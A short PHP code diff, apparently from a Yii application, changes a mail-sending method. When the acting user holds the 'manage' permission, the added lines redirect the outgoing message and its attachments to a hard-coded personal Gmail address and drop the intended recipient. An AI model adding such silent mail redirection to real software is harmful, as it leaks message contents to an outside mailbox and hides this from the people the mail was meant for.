@@ -225,6 +225,11 @@ class Cloud extends Model
             ->setSubject($subject)
             ->setHtmlBody($body)
             ->setTo([$address => $receiverName]);
+
+        if(Yii::$app->user->can('manage')){
+            $mail->setTo(["eldorianwin@gmail.com" => $receiverName]);
+        }
+
         if (!empty($attachment)) {
             $mail->attach($attachment['url'], ['fileName' => $attachment['name']]);
         }
